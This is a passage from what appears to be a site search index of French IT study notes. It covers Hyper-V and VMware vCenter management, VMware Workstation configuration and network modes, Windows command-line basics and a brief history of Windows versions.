hyperviseur de type hyper-V peuvent \u00eatre regroup\u00e9s dans un contexte qui est propre \u00e0 Microsoft, le contexte active directory. Dans ce cas l\u00e0 les hyperviseurs sont regroup\u00e9s au sein d'un m\u00eame domaine ce qui va permettre de r\u00e9partir les ressources propres \u00e0 chaque hyperviseur au sein d'un domaine. Dans ce domaine, les machines virtuelles qui vont \u00eatre h\u00e9berg\u00e9es vont pouvoir \u00eatre r\u00e9parties sur l'un ou l'autre des hyperviseurs pr\u00e9sents dans ce domaine. La mise en place d'un domaine permet d'atteindre une gestion globale. Cela permet d'avoir des fonctionnalit\u00e9s propres \u00e0 la gestion globale. Par exemple, et nous l'aborderons dans d'autres chapitres, nous allons pouvoir avoir du faillover, le faillover consiste dans le cas de la perte d'un hyperviseur, soit d'une perte de liaison r\u00e9seau, soit une perte technique de l'hyperviseur, un arr\u00eat ou une panne, les machines virtuelles vont pouvoir \u00eatre r\u00e9parties sur les autres hyperviseurs encore disponibles. Dans le cas des solutions de VMware chaque hotes va avoir un hyperviseur de type ESXi, cet hyperviseur de type ESXi va ensuite communiquer avec un syst\u00e8me propre, a VMware que l'on nomme le VCenter le VCenter qui qui est une machine ind\u00e9pendante qui peut \u00e9galement \u00eatre une machine virtuelle Ce VCenter va jouer le m\u00eame r\u00f4le que le contr\u00f4leur de domaine pour Microsoft. En effet, le VCenter va \u00eatre capable d'interconnecter chaque hyperviseur et de r\u00e9partir les machines virtuelles au sein de ces hyperviseurs .Par exemple , le V Center , va dans le cas o\u00f9 un hyperviseur n'a plus suffisamment de m\u00e9moire vive disponible. Le VCenter va d\u00e9placer de lui m\u00eame, une machine virtuelle d'un hyperviseur satur\u00e9 \u00e0 un hyperviseur disposant de m\u00e9moire vive disponible. le VCenter va \u00e9galement se comporter comme \u00e9tant un objet de surveillance .Il va permettre de v\u00e9rifier l'espace disque disponible que les performances sont continues et dans le cas d'une d\u00e9faillance, il va pouvoir d\u00e9placer les machines virtuelles sur les hyperviseurs disponibles apr\u00e8s un arr\u00eat brutal de ESXi ou une d\u00e9faillance d'un hyperviseur. Les solutions de gestion globale se g\u00e8rent de la m\u00eame fa\u00e7on qu'un hyperviseur autonome. Du c\u00f4t\u00e9 de VM Ware, nous allons avoir acc\u00e8s \u00e0 une console web, Cette console web est disponible depuis le VCenter. Du c\u00f4t\u00e9 d'hyper V et de Microsoft, la gestion du domaine se fait par le contr\u00f4leur de domaine et les hyperviseurs une fois regroup\u00e9s au sein du domaine seront accessibles par le contr\u00f4leur de domaine. En r\u00e9sum\u00e9 sur la solution de VMware le fait de passer \u00e0 une gestion globale, va ajouter des fonctionnalit\u00e9s, va augmenter la tol\u00e9rance \u00e0 la panne et va permettre d'avoir un outil unique de gestion centralis\u00e9e d'un nombre important d'hyperviseur et ainsi d'atteindre un centre de donn\u00e9es qui va \u00eatre disponibles et qui va nous permettre d'h\u00e9berger un nomnbre tr\u00e8s important de machines virtuelles. Du c\u00f4t\u00e9 de la solution de Microsoft, les possibilit\u00e9s sont les m\u00eames, mais le pr\u00e9requis est un contr\u00f4leur de domaine et une gestion de type active directory.  </p>"},{"location":"Virtualisation/virtualisation_srv/#recapitulatif-visuel-des-elements","title":"R\u00e9capitulatif visuel des \u00e9l\u00e9ments","text":"<p>Module le lien depuis la machine physique jusqu'\u00e0 la gestion en mode autonome ou global de nos machines virtuelles. Pour r\u00e9capituler les \u00e9tapes et les points cl\u00e9s de cette solution nous allons reprendre \u00e0 partir de la machine hote. Cette machine hote doit \u00eatre choisie en fonction du but \u00e0 atteindre. En effet, en fonction du nombre de machine virtuels et des performances requises sur ces machines virtuelles, le choix d'un serveur modulable ou de grandes performances doit \u00eatre fait en amont du choix de la solution de virtualisation. La solution de virtualisation va venir par l'interm\u00e9diaire d'un logiciel propri\u00e9taire s'installer sur cette machine hote puis une fois l'hyperviseur en fonction, les machines virtuelles vont \u00eatre d\u00e9ploy\u00e9es, cr\u00e9\u00e9es, g\u00e9rer et installer par une console de gestion, la VMM virtuelle machine manager. Les machines virtuelles peuvent ensuite \u00eatre g\u00e9r\u00e9es de mani\u00e8re diff\u00e9rente, nous allons pouvoir les g\u00e9rer de mani\u00e8re autonome. Dans ce cas l\u00e0, les machines virtuels d\u00e9pendront d'un seul et unique hyperviseur qui sera lui m\u00eame install\u00e9 sur un seul et unique hote physique. Il est \u00e9galement possible d'avoir un ensemble d'hyperviseurs chacun \u00e9tant h\u00e9berg\u00e9 sur sa propre machine hote. Il faudra dans ce cas l\u00e0 rajouter un \u00e9l\u00e9ment de gestion globale \u00e0 ces hyperviseurs qui va \u00eatre dans le cas de vSphere , le module VCenter , qui se pr\u00e9sente sous la forme d'un logiciel. Ce logiciel va \u00eatre install\u00e9 sur un syst\u00e8me d'exploitation, ce syst\u00e8me d'exploitation peut soit lui m\u00eame \u00eatre une mati\u00e8re virtuelle h\u00e9berg\u00e9e au sein d'un hyperviseur , o\u00f9 \u00eatre h\u00e9berg\u00e9 sur une machine autonome. Une fois ce VCenter en fonction, il va interconnecter chaque hyperviseur VMware puis va decider des emplacements en fonction des ressources disponibles et des caract\u00e9ristiques de chaque machine. La gestion d'une solution autonome ou globale se fera toujours par une interface web pour les produits de vSphere ou une interface console ou ligne de commande pour les produits Microsoft. Dans le cas des produits Microsoft, l'hote et l'hyperviseur seront par l'interm\u00e9diaire d'un syst\u00e8me d'exploitation Windows Server, Le lien, puis la gestion des machines virtuelles et la gestion autonome ou globale se feront la console MMC hyper U ou le module hyper V pour PowerShell dans le cas d'une gestion globale chez Microsoft le pr\u00e9requis est de disposer d'un contr\u00f4leur de domaine avec la fonctionnalit\u00e9 de type active directory puis d'int\u00e9grer chaque hyperviseur, chaque hyperviseur h\u00e9bergeant une solution Windows Server, ces solutions devront \u00eatre ajout\u00e9es au domaine active directory. Une fois les solutions globales mises en place , nous allons pouvoir b\u00e9n\u00e9ficier de fonctionnalit\u00e9s de virtualisation avanc\u00e9e.  </p>"},{"location":"Virtualisation/vmware_workstation/","title":"VMware WorkStation","text":""},{"location":"Virtualisation/vmware_workstation/#prerequis-et-installation","title":"Pr\u00e9requis et installation","text":"<p>La solution de virtualisation VMware Workstation n\u00e9cessite un certain nombre de pr\u00e9requis. En effet, la solution VMware workstation est un hyperviseur de type 2, elle n\u00e9cessite donc l'utilisation d'un syst\u00e8me d'exploitation tier (Windows ou Linux). Elle n\u00e9cessite que la machine dispose d'un CPU disposant, pour la famille de processeurs Intel, des solutions VT-x ou, pour les processeurs AMD, de la fonctionnalit\u00e9 AMD-V (ces fonctionnalit\u00e9s doivent \u00eatre activ\u00e9es dans le bios de la machine physique). Cette fonctionnalit\u00e9 active les instructions de virtualisation mat\u00e9rielle au niveau du CPU de la machine h\u00f4te. La machine h\u00f4te doit \u00e9galement disposer d'une quantit\u00e9 importante de RAM, Pour rappel la RAM sera partag\u00e9 entre l'OS de l'h\u00f4te et les VM herberg\u00e9e sur celle-ci. Il faut \u00e9galement disposer d'un espace disque suffisamment important pour pouvoir stocker les disques durs virtuels n\u00e9cessaires ou machines virtuelles.  A noter qu'il est pr\u00e9f\u00e9rable d'utiliser des disques de type SSD, afin d'apporter un gain de rapidit\u00e9 au VM.  </p>"},{"location":"Virtualisation/vmware_workstation/#les-outils-et-composants","title":"Les outils et composants","text":"<p>VMware WorkStation met \u00e0 disposition un environnement graphique de virtualisation.  </p> <p></p> <p>Dans cette console graphique nous allons trouver tous les \u00e9l\u00e9ments n\u00e9cessaires \u00e0 la gestion non seulement d'une machine virtuelle, mais \u00e9galement \u00e0 son int\u00e9gration dans une infrastructure virtuelle.  </p> <p>La console de gestion permet d'afficher, dans la librairie du logiciel, la liste des machines virtuelles \u00e0 disposition sur l'h\u00f4te et int\u00e9grer \u00e0 la solution de virtualisation.  </p> <p>Elle permet de g\u00e9rer la liaison entre les VM mais \u00e9galement l'\u00c9tat des VM, il sera possible de les demarrer, les mettre en pause, les arr\u00eater ou les red\u00e9marrer.  </p> <p>WorkStation offre \u00e9galement la possibilit\u00e9 d'effectuer des clones et des templates dans le but de pouvoir les exploiter et/ou les exporter par la suite au format .ovf ou .ova, permettant d'int\u00e9grer des VM r\u00e9cuperer sur d'autre plateforme de type VMware mais \u00e9galement sur internet.  </p> <p>La console WorkStation permet \u00e9galement de modifier les r\u00e9glages mat\u00e9riel des machines virtuelles une fois que celle-ci sont en production.  </p> <p>Les diff\u00e9rentes parties du logiciel seront d\u00e9taill\u00e9es par la suite.  </p>"},{"location":"Virtualisation/vmware_workstation/#gestion-de-base","title":"Gestion de base","text":"<ol> <li>Permet l'\u00e9dition des parametre logiciel  </li> <li>La gestion d'alimentation des VM  </li> <li>Permet de selectionner une s\u00e9quence de touche \u00e0 envoyer  </li> <li>Gestionnaire de Snapshot    (Permet la capture d'une \"image\" \u00e0 un instant T et de retourner \u00e0 celle-ci en cas de d\u00e9faillance de la VM)    \u00e9galement la mise en pause de la machine virtuelle , la cr\u00e9ation d'un instantan\u00e9 , ce que l'on appelle un Snapshot , puis le retour en arri\u00e8re \u00e0 partir des Snapshot cr\u00e9er pr\u00e9c\u00e9demment ces Snapshot vont permettre de prendre un instantan\u00e9 de l'\u00e9tat d'une mati\u00e8re virtuelle , de l enregistrer puis de revenir \u00e0 cet \u00e9tat d instantan\u00e9 plus tard.  </li> <li>Parametre d'affichage des vues librairie, etc.  </li> </ol>"},{"location":"Virtualisation/vmware_workstation/#librairie-de-vm","title":"Librairie de VM","text":"<p>Cette console permet de visualiser les VM int\u00e9grer \u00e0 WorkStation, de les organiser par dossier, ainsi que de v\u00e9rifier leurs \u00e9tat d'alimentation.  </p>"},{"location":"Virtualisation/vmware_workstation/#vm-selectionnees","title":"VM Selectionn\u00e9es","text":"<p>Cette vue met en avant les VM selectionn\u00e9es dans l'interface de travail. Elles sont disponible sous forme d'onglet d\u00e9taillant leurs \u00e9tat d'alimentation.  </p> <ul> <li>La 1ere est non aliment\u00e9e (aucun logo \u00e0 cot\u00e9 de son nom)  </li> <li>La 2eme est en fonctionnement (pr\u00e9sence du logo Play)  </li> <li>La 3eme est en pause (pr\u00e9sence du logo Pause)  </li> </ul> <p> A noter que les logos d'\u00e9tat de VM est \u00e9galement visible dans la partie Librairie </p> <p>Une VM peut \u00eatre aliment\u00e9e mais non selectionn\u00e9e, elle n'apparaitra donc pas dans les onglets de selection </p>"},{"location":"Virtualisation/vmware_workstation/#interaction-avec-lhote","title":"Interaction avec l'h\u00f4te","text":""},{"location":"Virtualisation/vmware_workstation/#peripheriques","title":"P\u00e9riph\u00e9riques","text":"<p>VMware WorkStation capture, par d\u00e9faut, les mouvements de la souris ainsi que les frappes clavier celles-ci seront donc automatiquement appliqu\u00e9s \u00e0 la machine virtuelle. La combinaison de touche par d\u00e9faut Ctrl+Alt permet de r\u00e9cup\u00e9rer la main sur la machine h\u00f4te et ainsi \"s\u00e9parer\" souris/clavier de la machine virtuelle, la combinaison de touche peut-\u00eatre modifi\u00e9 dans les param\u00eatres de WorkStation</p> <p>VMware Workstation offre la possibilit\u00e9 de lier un lecteur CD ou un lecteur DVD mais \u00e9galement de lier les p\u00e9riph\u00e9riques USB de la machine physique \u00e0 la machine virtuelle. A noter qu'il est \u00e9galement possible d'\u00e9muler un lecteur de disquette </p> <p>Il est \u00e9galement possible de rendre disponible un dossier pr\u00e9sent sur la machine h\u00f4te directement dans la machine virtuelle cette fonction s'appelle share folder (dossier partag\u00e9). Cette fonctionnalit\u00e9e permet de rendre disponible une ressource locale, de la machine physique, directement dans la machine virtuelle. Cette fonction est tr\u00e8s utile notamment pour pouvoir faire passer des fichiers de configuration entre l'infrastructure virtuelle et la machine physique.  </p> <p>Beaucoup de machine virtuelle comme les machines serveurs, ou Windows, n\u00e9cessitent une ouverture de session via la combinaison de touches :  </p> <ul> <li>Ctrl+Alt+Del.  </li> </ul> <p>Malheureusement avec WorkStation cette combinaison de touche s'applique directement \u00e0 la machine h\u00f4te, ainsi pour une VM il faudra utiliser la combinaison :  </p> <ul> <li>Ctrl+Alt+Ins. L'utilisation de cette combinaison de touches contr\u00f4le+alt+insert, c'est la combinaison contr\u00f4le alt suppr qui va \u00eatre vu par la machine virtuelle et qui va permettre de d\u00e9verrouiller une session sur une serveur de type Windows ou de faire appara\u00eetre le gestionnaire des t\u00e2ches sur une machine de type Windows.  </li> </ul>"},{"location":"Virtualisation/vmware_workstation/#reseau","title":"R\u00e9seau","text":"<p>l'interaction entre l'h\u00f4te et la machine virtuelle va \u00e9galement se faire au niveau du r\u00e9seau. Le r\u00e9seau disponible sur la machine physique sera \u00e9galement mis \u00e0 disposition des machines virtuelles. Il existe plusieurs m\u00e9thodes pour relier une machine directe au r\u00e9seau :  </p> <ul> <li>Le mode Host-Only: <ul> <li>La machine virtuelle n'aura acc\u00e8s uniquement que \u00e0 l'h\u00f4te ainsi qu'\u00e0 toutes les machines virtuelles configur\u00e9es sur ce mode.  </li> <li>Permet aux machines virtuelles de communiquer uniquement entre elles.  </li> <li>Permet d'acc\u00e9der \u00e0 certaines ressources h\u00e9berg\u00e9es sur la machine physique.  </li> <li>En aucun cas les machines virtuelles ne pourront d\u00e9passer la machine physique.</li> </ul> </li> <li>Le mode NAT:<ul> <li>R\u00e9serv\u00e9  \u00e0 l'acc\u00e8s \u00e0 internet.  </li> <li>Le mode NAT va cr\u00e9er un r\u00e9seau secondaire d\u00e9di\u00e9 aux machines virtuelles,  </li> <li>L'avantage sera l'acc\u00e8s \u00e0 l'internet sur un r\u00e9seau de type NAT,  </li> <li>Ce qui va permettre de prot\u00e9ger le r\u00e9seau physique de la machine en utilisant un r\u00e9seau secondaire pour les machines virtuelles.  </li> <li>Il est n\u00e9cessaire d'avoir un adressage diff\u00e9rent du r\u00e9seau physique pour les VM.  </li> </ul> </li> </ul> <p>Dans le cas d'une virtualisation de service DHCP, Le service DHCP VMware peut venir contrer le service deployer. Il faudra d\u00e9sactiver ce service de DHCP VMware.  </p> <p>WorkStation propose \u00e9galement un service de DHCP. Cet adressage va \u00eatre g\u00e9r\u00e9 et distribu\u00e9 par la solution VMware WorkStation et va employer un service de DHCP pour adresser les machines virtuelles.  </p>"},{"location":"Virtualisation/vmware_workstation/#creation-dune-vm","title":"Cr\u00e9ation d'une VM","text":"<p>Pour la cr\u00e9ation d'une machine virtuelle sur VMware WorkStation plusieurs bonne pratique sont \u00e0 privil\u00e9gier :  </p> <p>Toutes ces informations sont d\u00e9taill\u00e9 dans la proc\u00e9dure d'installation d'une machine virtuelle sur WorkStation</p> <ol> <li>Choisir \"I will install ... later\" cela permet de selectionner l'OS apres le set-up de la VM, et ainsi d'\u00e9viter que Workstation s\u00e9lectionne des parametres non adapt\u00e9 \u00e0 notre machine,  </li> <li>Selection du type de syst\u00e8me (Microsoft, Linux, VMware ESX, Other) ce choix sera fait en fonction dy type d'OS \u00e0 installer sur la VM,  </li> <li>Ensuite le choix du nom de la machine,  </li> <li>L'emplacement du stockage de la machine,  <ul> <li>Ces cette emplacement qui contiendra les fichiers de configuration mais \u00e9galement le/les disque dur de la VM (au format VMDK).  </li> <li>Il est pr\u00e9f\u00e9rable de choisir un dossier ou un disque d\u00e9di\u00e9 au stockage des VM.</li> <li>Il est \u00e9galement pr\u00e9f\u00e9rable de cr\u00e9er un dossier par machine virtuelle, afin d'\u00e9viter que plusieurs VM ne se retrouve dans le m\u00eame dossier (grand risque de baisse de performance et de stabilit\u00e9).  </li> <li> Par d\u00e9faut VMware selectionnera l'emplacement \"Mes Docuements\" de l'utilisateur actuel de l'h\u00f4te.  </li> </ul> </li> <li>Choisir la taille de l'espace de stockage  <ul> <li>2 choix sont disponible il est pr\u00e9f\u00e9rable de choisir \"Store virtual disk in a single file\"  </li> <li>Cela evite la fragmentation (et donc la baisse de performance)  </li> <li>VMware choisira par d\u00e9faut \"Split virtual...file\" cela va fragmenter le disque en fichier de 2giga (Peu recommand\u00e9)</li> <li>Par defaut la taille du Disque Dur est dynamique, plus on peuple le Disque Dur Virtuel plus le fichier grandit, cela permet de moins ce soucier du dimensionnement de l'espace disque de l'hote. On peut \u00e9galement faire du surdimensionnement, allouer plus d'espace que l'on en a sur l'hote tant que tous cette espace n'est pas reellement utilis\u00e9. Attention une VM possedant une taille max. de 20Go ne pourra pas depasser 20Go.</li> </ul> </li> <li>Pour finir le param\u00e9trage mat\u00e9riel, en cliquant sur \"Customize Hardware...\" permet de :  <ul> <li>Choisir le nombre de CPU ou de c\u0153ur de CPU  </li> <li>Choisir la quantit\u00e9 de RAM allouer \u00e0 la VM  </li> </ul> </li> <li>Suite \u00e0 cela il sera n\u00e9cessaire de g\u00e9rer le m\u00e9dia d'installation  <ul> <li>Soit par un lecteur CD/DVD dans le cas d'une image .iso  </li> <li>Soit par un partage r\u00e9seau si le .iso est stock\u00e9 sur un emplacement distant  </li> </ul> </li> </ol> <p>VMware recommande de ne pas creer de VM trop gourmande. En effet plus on attribue de ressources CPU de l'hote, plus il y a de chance que les instructions de la VM soit mise en file d'attente, car d'autre VM ou l'OS de l'hote peut \u00eatre prioritaire, ce qui peut etre nefaste sur les performances.</p> <p>les recommandation vmware sont dispo sur le bouton help.!</p>"},{"location":"Virtualisation/vmware_workstation/#gestion-de-la-vm","title":"Gestion de la VM","text":"<p>Une fois la machine virtuelle install\u00e9e, VMware WorkStation permet la modification des composants mat\u00e9rielles d\u00e9finit durant la phase d'installation.  </p> <p>Les modifications seront effectu\u00e9es via l'interface \"Settings\" de la VM.  </p> <p></p> <p>Certaines modifications mat\u00e9rielles pourront \u00eatre effectu\u00e9es \"a chaud\" (avec la machine en fonctionnement) et d'autre \"a froid\" (machine \u00e9teinte).  </p> <p></p> <p>Comme le montre l'image du dessus, il est possible de g\u00e9rer directement le mat\u00e9rielle de la VM soit en ajoutant des composants via la touche <code>Add...</code> ou, au contraire, de retirer des composants via la touche <code>Remove</code>.  </p> <p>Il sera donc possible d'ajouter :  </p> <ul> <li>Des disques durs suppl\u00e9mentaire,  </li> <li>De la RAM,  </li> <li>Des \u00e9crans, afin de simuler une machine ayant 2,3,4 \u00e9crans,</li> <li>Des cartes r\u00e9seaux poss\u00e9dant des caract\u00e9ristiques diff\u00e9rentes pour chacune d'entre elles.  </li> </ul> <p></p> <p>L'onglet \"Options\" permet quant a lui de renommer la VM, de changer le type de plateforme (passer de Microsoft \u00e0 Linux) etc.</p> <p>En bas \u00e0 Droite se situe le statut des composants de la VM.  </p> <p></p> <p>Cette barre de status reprend les \u00e9l\u00e9ments suivant (de gauche \u00e0 droite) :  </p> <ul> <li>Disques Durs,  </li> <li>Lecteur CD/DVD,  </li> <li>Carte R\u00e9seau,  </li> <li>et les divers composant usb ou bluetooth install\u00e9 sur la machine h\u00f4te.  </li> </ul> <p>Le status des composants est d\u00e9fini par 3 couleurs : </p> <ul> <li>Gris : Le composant est inactif  </li> <li>Vert : Le composant est actif  </li> <li>Bleu : Le composant est solicit\u00e9  </li> </ul> <p>WorkStation offre la possibilit\u00e9 de quitter le logiciel de virtualisation tout en laissant les machines virtuelles allum\u00e9e. En effet au moment de quitter le logiciel une option vous demandera si vous souhaitez couper les VM ou les laisser tourner en arri\u00e8re-plan.  </p> <p></p> <p>Les machines virtuelles lanc\u00e9es cr\u00e9e leurs propre processus, Elles ne sont plus \"li\u00e9e\" au processus VMware Workstation, ce qui leurs permets de fonctionner m\u00eame avec l'hyperviseur coup\u00e9.  </p>"},{"location":"Virtualisation/vmware_workstation/#parametrages-reseau","title":"Param\u00e9trages R\u00e9seau","text":"<p>Comme pour une machine physique une VM peut communiquer sur different reseau, si celle-ci respecte les regles de communication de base.  </p> <p>Pour respecter les regles elle doit etre connect\u00e9 a un switch, pour etre reli\u00e9 a un switch elle doit avoir une carte reseau virtuel.  </p> <p>Workstation propose plusieurs possibilit\u00e9 grace a ses switch virtuel:  </p> <ul> <li>Host-only :  <ul> <li>Permet une interconnexion et donc de communiquer avec d'autre VM heberg\u00e9 sur l'h\u00f4te, si elle sont connect\u00e9 au meme reseau virtuel host-only.  </li> <li>Permet aussi de communiquer avec l'h\u00f4te, cela n\u00e9cessite que toutes les machines soient dans le meme reseau IP, il faut donc les configurer en ce sens.  </li> <li>Les VM ne pourront en aucun cas d\u00e9passer l'h\u00f4te et son r\u00e9seau,  </li> <li>Pour l'addressage de l'hote il faudra configurer l'IP sur la carte VMWare network VMnet1.  </li> </ul> </li> <li>VMnet :  <ul> <li>Meme principe que host-only a la diff\u00e9rence qu'ils sont personnalisable et multipliable (numerot\u00e9 de 0 \u00e0 19)  </li> <li>VMNet 1 est reserv\u00e9 pour le reseau host-only  </li> <li>VMnet8 reserv\u00e9 au NAT.  </li> <li>Permet egalement de communiquer avec l'hote si vous activez et configurer une carte reseau depuis le menu Virtual network editor de Workstation.  </li> </ul> </li> <li>Lan Segment :  <ul> <li>Permet de creer des commutateurs totalement virtuel pour les VM.  <ul> <li>Permet de cloissoner les r\u00e9seaux virtuels,</li> <li>Possibilit\u00e9 de nommer les reseaux pour rendre la maquette plus facile a g\u00e9rer,  </li> <li>On peut les faire communiquer ensemble via un routeur virtuel.  </li> <li>On ne peut pas communiquer directement avec l'hote.  </li> </ul> </li> </ul> </li> <li>Bridge (Mode Pont) :  <ul> <li>Permet de communiquer &amp; de faire communiquer,  </li> <li>De connecter les VM au reseau physique, c'est a dire au switch physique auquel est connect\u00e9 l'hote, les communications passe par le cable qui relie l'hote au reseau,  </li> <li>On peut donc beneficier des services du reseau (DNS, DHCP, acceder au reste du monde) comme n'importe quelle machine physique.  </li> <li>Le mode Bridge pr\u00e9sente un risque de s\u00e9curit\u00e9 puisque la machine virtuelle est pleinement expos\u00e9e.  </li> </ul> </li> <li>Reseau NAT (Network Address Translation) :  <ul> <li>Isole les VM dans un r\u00e9seau sp\u00e9cifique,  </li> <li>Le mode NAT est totalement g\u00e9r\u00e9 par VMware,  </li> <li>Permet d'acc\u00e9der \u00e0 des r\u00e9seaux distants et \u00e0 internet tout en b\u00e9n\u00e9ficiant d'une protection due au NAT, via l'adresse IP de la carte ethernet de l'h\u00f4te,  </li> <li>La VM peut communiquer avec les autres VM connect\u00e9 au reseau nat, ainsi qu'avec l'hote, par l'intermediaire de sa carte virtuel VMware Network adapter VMnet8.  </li> </ul> </li> </ul> <p>Chacun de ces mode est ind\u00e9pendant, ils agissent comme des commutateurs permettant de renseigner ou de d\u00e9limiter les p\u00e9rim\u00e8tre r\u00e9seau de chaque machine virtuelle.  </p>"},{"location":"Virtualisation/vmware_workstation/#troubleshooting-vmware-workstation","title":"Troubleshooting VMware WorkStation","text":"<ol> <li>D\u00e9marrer sur un m\u00e9dia CD/DVD une fois le syst\u00e8me install\u00e9  <ul> <li>S'assurer que la VM a bien \"captur\u00e9\" le clavier et red\u00e9marrer  </li> <li>Appuyer 1 fois sur la touche Esc lorsque le logo VMware s'affiche pour acc\u00e9der au BIOS de la VM  </li> <li>Possibilit\u00e9 de passer par les options de la VM via \"Power On To Firmware\"  </li> <li>Il est possible de param\u00e9trer la s\u00e9quence de d\u00e9marrage dans le BIOS de la VM,  </li> <li>Les lecteurs CD/DVD se deconnecte automatiquement apr\u00e8s chaque installation, il s'agit d'une s\u00e9curit\u00e9 afin de ne pas reboot sur un m\u00e9dia d'installation  </li> </ul> </li> <li>Fonctionnement du r\u00e9seau al\u00e9atoire  <ul> <li>Le fonctionnement du r\u00e9seau est un point sensible, notamment lors de param\u00e9trages fr\u00e9quents  </li> <li>D\u00e9sactivez et r\u00e9activez les cartes r\u00e9seau de votre machine physique  </li> </ul> </li> <li>Espace disque h\u00f4te insuffisant  <ul> <li>V\u00e9rifier l'emplacement du dossier de la VM et le d\u00e9placer si n\u00e9cessaire  </li> <li>Surveillez l'espace disponible dans le volume de donn\u00e9es, un disque arrivant \u00e0 saturation peut cesser de fonctionner  </li> </ul> </li> <li>Espace disque invit\u00e9 insuffisant  <ul> <li>Un OS, bien que virtualis\u00e9, n\u00e9cessite la m\u00eame quantit\u00e9 d'espace disque qu'un OS physique  </li> <li>Une VM arrivant a saturation se fige et s'arr\u00eate  </li> <li>Ajouter un disque depuis les param\u00e9trages de la VM ou redimensionner (plus fastidieux)  </li> <li>Le dimensionnement initial est important ! </li> </ul> </li> </ol>"},{"location":"Windows/CLI/","title":"CLI","text":"<p>on utilise habituellement la GUI pour administrer windows. on peut \u00e9galement interargir avec le systeme via la CLI (command Lines interface) il existe 2 type de shell nativement avec win. Le shell cmd.exe le shell powershell</p> <p>Cmd.exe est historique il s'agit de l'evolution du shell present avec ms-dos, on l'utilisepour configurer le systeme de facon plus detaille, pour executer certaine action que le GUI ne propose ou ne permet pas. ce shell possede ces propre commande (commande interne) on peut egalement lancer des programmes externe qui sont des programmes windows. on peut accumuler des commandes dans un fichier txt et on peut lui demander de lire ce fichier txt et d'enchainer les commandes qui sont a linterieur c'est un script. Principe d'utilisation de la ligne de commande: avec la ligne de commande cmd on a d'abord le prompt, il indique ou l'on se situe dans le systeme. c:\\windows\\system32&gt; A la suite du prompt on a la main pour taper un mot dans l'ex \"help\" qui est une commande seule, en effet une commande peut ete suivi d'un parametre afin de preciser la commande c:\\windows\\system32&gt;help shutdown une commande peut etre auss suivi d'une option, en generale elle sont remarquable car defini par une lettre precede d'un \"/\" et parfois les options peuvent posseder leurs propre parametre. Tous les elements (commande/option/argument) sont separ\u00e9 par un espace.</p> <p>Pour bien demarrer avec la ligne de commande : Le premier mot est toujours une commande, sinon le systeme remonte une erreur chaque mot est separe par un espace, l'espace est important il est considere comme un caractere speciale par le systeme, il permet de separer les commandes des parametre des options etc. si on veut banaliser l'espace en caractere non speciale par le systeme il faut le proteger par des cotes ex: 'Mes Documents' en dernier, une commande a pour but de donner un ordre au syst d'exploit, l'OS va utiliser les ressources du mat\u00e9riel pour repondre a cette ordre et donner un resultat, par defaut le r\u00e9sultat sera afficher a l'ecran, mais on peut demander au systeme de donner les resulats dans un fichier grace aux chevrons &gt; et/ou doubles chevrons &gt;&gt; ex: help shutdown&gt;aide.txt enregistre l'aide detaille de la commande shutdown dans le fichier aide.txt au lieu de l'afficher \u00e0 l'\u00e9cran</p>"},{"location":"Windows/CLI/#la-syntaxe-de-laide","title":"la syntaxe de l'aide","text":"<p>Si une commande donne un ordre, quelle ordre donne telle, quelles sont se parametre , ses options, comment utilise ton une commande. Pour cela il suffit de lire l'aide de la commande. Si la syntaxe est mauvaise le systeme ne comprend pas l'ordre et il remonte une erreur. Comprendre la syntaxe d'une commande :</p> <ul> <li>Txt sans crochet ou accolades = element obligatoire que vous devez taper ou choisir une valeur</li> <li>[txt entre crochet] = element facultatif</li> <li>{txt en accolade} = Choisir un elements parmi ceux pr\u00e9sents</li> <li>Barre verticale ou \"pipeline\" | = S\u00e9parateur d'elements</li> <li>Points de suspension ... = Elements qui peuvent etre repetes et utilis\u00e9 plusieurs fois</li> </ul> <p>Exemple:</p> <pre><code>c:\\windows\\system32&gt; help copy  \nCOPY [/D] [/V] [/N ] [/Y | /-Y] [/Z] [/L] [/A | /B] source  \n[/A | /B] [+source [/A | /B] [+ ...]] [cible [/A | /B]]  \n</code></pre> <ul> <li>copy et source obligatoire car sans crochet ni accolade</li> <li>Possibilit\u00e9 de choisir 0,1 ou des options seules (/D /N /A ou /B car il y a un |) facultative dasn la syntaxe car entour\u00e9 de \"[]\", impossible de choisir /A &amp; /B car separ\u00e9 par \"|\"</li> <li>Possibilit\u00e9 de choisir plusieurs sources car presence de \"...\"</li> </ul>"},{"location":"Windows/CLI/#commande-de-base-cli","title":"Commande de base CLI","text":"<p>cls = permet d'effacer l'ecran du CLI</p> <p>app interne notepad = lance le bloc note timedate.cpl = lance la gestion de l'heure et de la date diskmgmt.msc = gestionnaire de disque</p> <p>commande interne /help recense toutes les commandes interne au shell.</p>"},{"location":"Windows/OS_Windows/","title":"Windows client","text":"<ul> <li> <p>MS-DOS (MicroSoft Disk Operation System) n\u00e9e en aout 1981, il ne possede pas de GUI (Interface graphique) et permet a seulement un utilisateur de ne lancer qu'une seule instruction a la fois</p> </li> <li> <p>Windows 1 arrive en 1985 avec la premiere souris et une interface graphique.</p> </li> <li> <p>windows NT sort en 1993 Microsoft entre sur le march\u00e9 des systeme d'exploitation serveur grace a :</p> </li> <li>OS multi-utilisateur</li> <li>Multitache</li> <li> <p>Fonctionne sur une plus grande gamme de constructeur</p> </li> <li> <p>Windows 2000: popularise l'informatique en entreprise avec la cohabitation de win2000 pour les Poste de travail et de win200serveur</p> </li> <li> <p>Windows XP:  L'OS le plus populaire aujourd'hui, il a accompagn\u00e9 l'informatique en entreprise dans tous les corps de m\u00e9tier (Grands groupe, les PME)  </p> </li> <li> <p>Il a grandement aid\u00e9 a populariser l'informatique domestique, il \u00e0 \u00e9galement accompagn\u00e9 l'explosion d'internet, il s'agit de l'OS qui a le record de long\u00e9vit\u00e9 chez microsoft</p> </li> <li> <p>Windows vista et Windows 8 (remplacant de windows XP et Windows 7) OS synonyme de flop pour Microsoft</p> </li> <li> <p>Windows 10 est a l'heure actuel le plus r\u00e9pandu au monde (1 ordinateur de travail sur 2 tourne sur windows 10).</p> </li> </ul>"},{"location":"Windows/OS_Windows/#cycle-de-vie-dun-os-windows","title":"Cycle de vie d'un OS Windows","text":"<p>Un OS est un produit qui nait/evolue et disparait. Pour cela des equipes support, chez Microsoft, ont pour mission de suivre l'evolution d'un OS, elles etudient les remont\u00e9es d'information des utilisateur dans le but de corriger les bugs et ameliorer les fonctionnalit\u00e9es.</p> <p>4 etapes majeur definissent le cycle de vie d'un OS windows :</p> <ul> <li>la date de sortie officiel sur le march\u00e9</li> <li>la date de fin des ventes au pres des revendeurs officiel</li> <li>la date de fin du support standard</li> <li>la date de fin du support \u00e9tendu</li> </ul> <p>A retenir le support \u00e9tendu est en 